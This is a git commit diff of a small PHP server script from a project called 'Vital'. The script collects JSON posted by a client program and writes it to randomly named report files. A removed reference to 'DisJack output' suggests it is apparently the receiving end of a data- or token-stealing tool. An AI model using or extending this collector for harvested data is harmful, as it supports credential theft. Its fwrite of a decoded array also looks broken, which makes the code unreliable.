f04060a3d4615941a2a110e7a972148497446560
0x44F <89411010+0x44F@users.noreply.github.com>
2021-10-13 02:53:05 +1300

    Update index.php

--- server/index.php
+++ server/index.php
@@ -1,6 +1,16 @@
 <?php
-    $content = "";
-    $webhook = fopen('php://input' , 'rb');
+    require __DIR__ . '/functions.php';
+    /* 
+    *   Server code for Vital (PHP)
+    *   ===========================
+    *   Collects the data sent from
+    *   client file (main.py)
+    *
+    */
+    
+    $content    =   "";
+    $webhook    =   fopen('php://input' , 'rb');
+    $random     =   randomString('0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', 7);
 
     while (!feof($webhook)) {
         $content .= fread($webhook, 4096);
@@ -9,8 +19,10 @@
     fclose($webhook);
 
     $data = json_decode($content, true);
+    
+    $fhandle = fopen("REPORT-{$random}", "w") or die("Could not create a new output file.");
 
-    $details = fopen("newfile.txt", "a") or die("Failed to open DisJack output");
-    fwrite($details, $data);
-    fclose($details);
+    fwrite($fhandle, $data);
+    fclose($fhandle);
+
 ?>
